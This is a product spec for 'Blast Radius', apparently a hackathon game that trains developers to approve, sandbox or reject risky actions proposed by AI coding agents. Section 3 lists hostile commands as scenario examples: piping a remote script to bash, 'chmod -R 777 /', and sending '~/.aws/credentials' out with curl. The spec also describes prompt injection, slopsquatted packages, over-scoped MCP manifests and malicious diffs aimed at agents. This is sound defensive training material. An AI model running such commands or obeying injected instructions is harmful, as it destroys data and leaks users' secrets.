# Blast Radius — Original Product Spec

> **Planning reference, not implementation status.** See `README.md` for the shipped
> behavior. The MaRa-backed forensic round described below is explicitly deferred.

> The build spec for Codex. This defines *what* to build. `02_CODEX_PLAYBOOK.md` covers *how* to build it with Codex. When in doubt, favor **one deep, polished, bulletproof loop** over breadth — the "Design" criterion rewards a complete coherent slice, not a broad broken one.

## 1. The pitch (say it exactly like this)

> Your AI coding agent asks you to approve dozens of actions a day. Rubber-stamp one wrong call and you're owned. **Blast Radius** puts you in the operator's seat, generates a fresh risky agent-action every round, and **grades your reasoning against verified ground truth** — so you learn to size the blast radius before your agent burns you.

**Anti-Gandalf framing:** "Lakera's Gandalf teaches you to *attack* a bot. Blast Radius teaches you not to get *owned* by your own agent." We own the empty **defender / operator** lane.

## 2. Player experience (the core loop)

One round =:

1. **The ask.** A realistic snippet from an AI-coding-agent session appears: the agent proposes an action and wants your approval. (See §3 for the five action families.) A mild countdown timer runs — enough to feel real approval pressure, not enough to be a reflex test.
2. **The decision.** Player picks one of:
   - **APPROVE** — let it run as-is.
   - **SANDBOX** — allow it, but configure the **blast radius**: which paths it can read/write, network egress on/off (+ allowlist), which capabilities/secrets it may touch.
   - **REJECT** — block it.
3. **The reasoning.** Player types **one line: *why*.** (This is load-bearing — see §6. You never "win" by clicking; you win by articulating the tell.)
4. **The verdict + receipts.** The critic pass reveals ground truth and grades **both** the decision and the reasoning, returning **receipts** — concrete, checkable facts (e.g. *"`reqests` is not on PyPI; the real package is `requests` — this is slopsquatting"*; *"manifest declares `read-only` but the source opens an outbound socket to a raw IP"*). A short **Socratic explanation**: why the attack would have worked, and what defense stops it.
5. **Adapt.** The next round's difficulty and blind-spot targeting adjust to what the player just missed (§5).

Wrapping the session: a **pre-test** (5 questions) before round 1 and an **identical post-test** after the last round, producing a **measured competency delta** and a shareable mastery result (§6).

## 3. The five action families (core round content)

Every scenario is a bounded variation on a **verified template** (§7) drawn from one of these families. This is the OWASP LLM / agentic-coding threat surface, made playable:

1. **Dangerous command** — e.g. `curl https://x.sh | bash`, `chmod -R 777 /`, a destructive `rm`, exfil via `curl --data @~/.aws/credentials`. Tell: irreversible / over-broad / phones home.
2. **Poisoned dependency** — a suggested `pip install` / `npm i` of a **hallucinated or slopsquatted** package (typo of a real one; a name the model invented that an attacker has since registered). Tell: package has no/thin history; near-miss of a popular name.
3. **Over-scoped skill / MCP manifest** — a tool the agent wants to install that requests capabilities far beyond its stated job (reads `~/.ssh`, `.env`, full network). Tell: declared scope ≠ actual behavior.
4. **Malicious diff** — a code change that looks like a bugfix but quietly adds a data-exfil call, disables a check, or widens permissions. Tell: the diff does something the PR description doesn't mention.
5. **Poisoned context** — a README / issue / web page / tool result containing hidden instructions the agent is about to obey (indirect prompt injection). Tell: untrusted content is steering the agent.

## 4. The two fold-in round types (breadth + moat)

- **Skill-marketplace audit** (the OpenClaw scenario). GPT-5.6 generates a candidate "skill" for a clearly **fictional** marketplace: a plausible README, a declared permission manifest, the actual source, and a simulated runtime egress log. Player inspects (manifest vs source vs traffic) and rules **INSTALL / SANDBOX / QUARANTINE**, then names the tell. Ground truth is a planted `benign | malicious` label with the specific giveaway. Escalation: later skills hide the payload better (split across files, spoof a trusted publisher).
- **Forensic triage** (the moat). GPT-5.6 spins up a fresh compromise scenario surfaced through **real artifact output from the MaRa SIFT MCP server** (see `02_CODEX_PLAYBOOK.md` §MCP). Player classifies the finding, names the likely technique, decides the containment move, and justifies it. Ground truth = the actual forensic record. This is the strongest possible "grade against *real* ground truth" claim, and it's yours alone.

Keep each fold-in to **one deeply-built scenario family**. They exist to broaden threat coverage and prove the moat, not to sprawl.

## 5. The engine — GPT-5.6 in three roles

The engine is the product. It is a **self-critiquing agent loop**: generate → (self-check) → adapt → grade → (self-check). Present it as *"a for-loop with receipts,"* never as scaffolding.

- **Generator.** Given a verified template + difficulty + the player's blind-spot profile, synthesizes a concrete, realistic scenario (the ask, the artifacts, and a hidden ground-truth record). Variation makes every run non-Googleable.
- **Adversary.** Steers the *next* generation toward what the player keeps missing (rubber-stamps under time pressure → smuggle a malicious action among benign ones; ignores manifests → make the tell a manifest).
- **Critic-Grader.** A **separate pass** that does two jobs:
  1. **Correctness gate (before display):** verify the generated scenario is internally consistent with its ground-truth label and doesn't teach anything false. **A scenario that fails the gate is never shown** — the engine falls back to the curated bank (§7).
  2. **Grade (after the player answers):** score the decision *and* the free-form reasoning against ground truth; emit receipts + the Socratic explanation.

**Model tiering (cost + quality):** cheap tier for bulk generation, **flagship / max reasoning effort for the critic gate** (correctness matters most there), mid-tier for adaptation. **Prompt-cache the static spine** (templates + rubric preamble). *Reconcile exact model IDs and the names of features below against live OpenAI docs on Day 1 — the research reported them second-hand:* GPT-5.6 family with `sol`/`terra`/`luna` tiers, ~1M-token context, **Structured Outputs** (for the generator schema and receipt format), and a **reasoning-effort** control (for the critic).

## 6. Pedagogy / engagement layer (cheap, high-leverage for Potential Impact)

- **Reasoning-first grading.** Grade the *why*, not a flag string. This is the core novelty and the reason a static CTF can't copy us.
- **Reflection after every round.** The player must articulate the tell; the tutor responds Socratically. Research shows this reflection loop is the #1 differentiator between games that teach and games that don't.
- **Pre/post test.** 5 questions before and the same 5 after → a **measured score delta**. Show it on screen in the demo — this converts "I think it teaches" into "it measurably teaches," and it's the impact clincher that reaches judge Belsky even off the Education track.
- **Shareable mastery result.** A competency map (which tells you catch, which you miss) + a shareable result card. One moment of **wit/personality** somewhere in the product (a dry line from the "agent," a cheeky game-over) — the panel rewards delight.

## 7. Correctness spine + fallback bank (build this FIRST — Days 1–2)

The single biggest risk is teaching a **wrong** exploit. Defenses:

- **Verified template spine.** A hand-curated set of scenario templates, each grounded in a real, cited pattern: **OWASP LLM Top 10** (esp. LLM01 prompt injection), the **Copilot RCE pattern (CVE-2025-53773)**, documented **slopsquatting** package data, real **MCP/skill supply-chain** patterns, and MaRa SIFT outputs for the forensic family. The generator only produces *bounded variations* on these — it never free-invents a vulnerability class.
- **Critic correctness gate** (§5) as a mandatory pre-display check.
- **Curated fallback scenario bank.** ~15–20 hand-verified, ready-to-serve scenarios covering every family and difficulty. **The live demo runs off this bank**, so a bad live generation can never tank the demo. Live generation is the "infinite content" story; the bank is the safety net.

## 8. Data model (commit on Day 0/1)

```
Scenario {
  id, family,                 // one of the five families or a fold-in type
  template_ref,               // which verified spine template this varies
  difficulty,                 // 1..N, driven by adaptation
  presentation {              // what the player sees
    ask_text, artifacts[],    // command / diff / manifest / README / egress log ...
  },
  ground_truth {
    correct_action,           // approve | sandbox | reject  (or install/sandbox/quarantine)
    safe_blast_radius,        // for sandbox: allowed paths, egress, capabilities
    tells[],                  // the specific giveaways, each with a citable receipt
    receipts[],               // {claim, evidence}  e.g. {"not on PyPI", "<lookup/why>"}
    citation,                 // the spine source this is grounded in
  },
  gate_status,                // passed | failed  (failed => never displayed)
}

PlayerDecision { scenario_id, action, blast_radius_config?, reasoning_text }

GradeResult {
  verdict,                    // correct | partial | wrong
  action_correct, reasoning_score,
  matched_tells[], missed_tells[],
  receipts[],                 // shown to the player
  socratic_followup,          // "why it worked / what stops it"
}

LearnerProgress {
  session_id,
  pretest[], posttest[],      // same 5 questions; delta computed
  competency_map,             // per-tell hit/miss rates -> feeds the Adversary
  streak, rounds_played,
}
```

## 9. UI (browser, no install for the player)

Single-page app, works on desktop and mobile web. Screens:
- **Round view:** the ask + artifacts, the timer, the APPROVE/SANDBOX/REJECT control, the blast-radius configurator (only when SANDBOX), and the one-line reasoning box.
- **Verdict reveal:** verdict + **receipts** (each a concrete, checkable claim) + Socratic explanation. Make the reveal feel earned (a beat of animation on a correct catch).
- **Pre/post test** screens and a **results/mastery** screen with the score delta and shareable card.
- **Coverage/competency map** (which tells you're strong/weak on).
- Clean, dark, developer-terminal aesthetic. Fast. One tasteful moment of wit.

The hosted version must be **one-click for judges, pre-loaded, no rebuild** (Dev Tools requirement #9).

## 10. Fixed demo path (rehearse it)

Scripted, deterministic, runs off the fallback bank so it cannot fail live:
1. Pre-test (show the low score).
2. A dangerous-command round → player SANDBOXes → receipts reveal.
3. A slopsquatted-dependency round → player REJECTs → the "not on PyPI" receipt.
4. The **skill-marketplace audit** round (the OpenClaw beat).
5. A round where the player rubber-stamps and **gets owned** → adversary escalation shown.
6. **The critic catching its own bad generation** (or a mis-reasoned answer) live — the verification money shot.
7. Post-test (show the delta).

## 11. Cut list (do NOT build these)

- No multiplayer, no leaderboards-as-core-loop, no XP/badge economy (points read as gimmick to this panel).
- No user accounts or long-term persistence beyond a session (a session id is enough).
- No art assets, story world, characters, or levels/map.
- No offense-only "capture the flag" mode (saturated; reads derivative).
- No more than **one deeply-built scenario family per round type**. Depth over breadth.
- No live-fire vulnerable environments to host (expensive, risky) — scenarios are generated artifacts + simulated logs, not live exploit boxes.

## 12. Definition of done (product)

- The core loop runs end-to-end in the browser off both **live generation** and the **fallback bank**.
- The critic **correctness gate** demonstrably refuses a bad scenario (have a test that feeds it a known-wrong scenario and asserts it's blocked).
- Both fold-in rounds work (skill-audit; forensic-triage against MaRa SIFT).
- Pre/post test produces a real delta; reflection + receipts show on every round.
- Hosted demo is one-click, pre-loaded, and survives a cold visit from a logged-out browser.
- Tests exist for the engine (generator schema, gate, grader) and pass.
